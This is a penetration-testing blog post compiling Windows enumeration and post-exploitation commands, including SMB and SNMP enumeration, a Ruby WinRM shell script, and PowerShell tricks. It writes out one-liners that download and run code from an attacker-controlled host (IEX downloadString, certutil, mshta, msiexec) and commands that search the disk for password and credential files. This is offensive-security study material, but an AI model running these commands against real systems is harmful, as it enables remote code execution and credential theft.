---
layout: post
title: "Windows enumeration: Tricks and tools compendium"
categories: [ENUMERATION,WINDOWS,PRIVESC]
---

Well, we spend time enumerating a Windows machine externally, and we might have an exploit, or any vulnerability that can lead us to RCE but... If you are like me, usually used to hack Linux boxes, you'll have a hard time playing on a Windows machine. That's what is this post about, learing about getting a reverse shell on windows and some things we can use on it.

## Basic telnet and ftp 

```bash
# Maybe we see telnet open?
telnet x.x.x.x #If we got creds

#Ftp open?
ftp <ip> #If anonymous login is enabled we can use anonymous as user and pass

# FTP commands
ftp get # Download a file
ftp put # Upload a file

wget -m ftp://anonymous:anonymous@<ip> # If we can login, we can download all the FTP

```

Okay... we got no telnet or ftp, just the usual windows shares port (445/tcp), how do we enumerate that?

## SMB Enumeration

```bash
#Enumerate permissions
smbmap -H <ip> 
smbmap -H <ip> -d Domain -u user -p password

#Actually connect to the share
smbclient -L <ip>
smbclient //<ip>/share

#Enum4linux can help to extract some info
enum4linux -a <ip>

#Impacket Lookupsid (Enumerate users)
lookupsid.py user:password@<IP>
use auxiliary/scanner/smb/smb_lookupsid # also in metasploit
```

Well, more enumeration...

## SNMP

```bash
#SNMP checks
snmpenum -t <ip>
snmpenum -t <ip> -c public -v2c #If we know community and version

#Snmp v3
nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
```

If we got a WinRM open (Usually port 5985), we can try the MSF module related, or if we want to do it manually, there is a
good article on building a Ruby shell [here](https://alionder.net/winrm-shell/)

Let's do it one as a example:

```rb
#shell.rb

require 'winrm'

conn = WinRM::Connection.new(
  endpoint: '<ip>',
  user: '<user>',
  password: '<password>',
)

command=""

# We can use cmd or powershell as a shell
conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```


Maybe if we get RCE with some of beforementioned ways, it'll be a "stub" shell, maybe with no keys support so, here is a bit of powershell tricks:

## Powershell
```powershell

# Download file one liners
(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 
Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip"  # Newer versions (4,5)

# Download and run a script
IEX(New-Object Net.WebClient).downloadString('http://<ip>/script.ps1')

# Encoding a command to use in Windows
echo -n "<COMMAND>" | iconv --to-code UTF-16LE | base64 -w 0
powershell -EncodedCommand <base64_cmd>

```

## Another ways to download or execute files remotely
```powershell
# Certutil
certutil.exe -urlcache -split -f "http://<ip>/object" C:\\tmp\\program.exe && C:\\tmp\\program.exe

# Malicious hta file
mshta.exe http://<ip>/test.hta
use exploit/windows/misc/hta_server #Metasploit

# Malicious msi package
msiexec /q /i http://<ip>/test.msi
```

Now... we got a low priv shell, what can we do?

```powershell
#Check systeminfo
systeminfo
hostname
echo %PATH%

# Network
ipconfig
ipconfig /all

# Patches installed
wmic qfe

# Search filesystem
dir /s *pass* == *username* == *cred*
findstr /si private *.php *.xml *.txt #Search private files

...
```

We can also check some scripts to do this work for us, enumerating Critical vulnerabilites like unquoted service paths and more.
I grouped some of this scripts at the bottom of this page, in the section Links/Scripts.
Usually I like to run two of them, JAWS for general enumeration, and Watson for exploit related one.

Before finishing the post, there is a set of tools by Mark Russinovich from Microsoft. The Sysinternals pack.
I've used this tools a lot of times, for example PsExec to executing commands on another user, or ProcDump to dumping process memory to examine it.
They can be dowloaded individually [there](https://live.sysinternals.com/). And also as a pack on [https://docs.microsoft.com/en-us/sysinternals/downloads/](https://docs.microsoft.com/en-us/sysinternals/downloads/).


## Links / Scripts

[JAWS - Windows](https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1)

[Watson](https://github.com/rasta-mouse/Watson)

[WindowsPrivescCheck - PentestMonkey](https://github.com/pentestmonkey/windows-privesc-check)

[Nishang - Offensive Powershell](https://github.com/samratashok/nishang)

[Powershell - Scripts](https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70)

## Resources / Guides

[Windows Escalation](https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html)
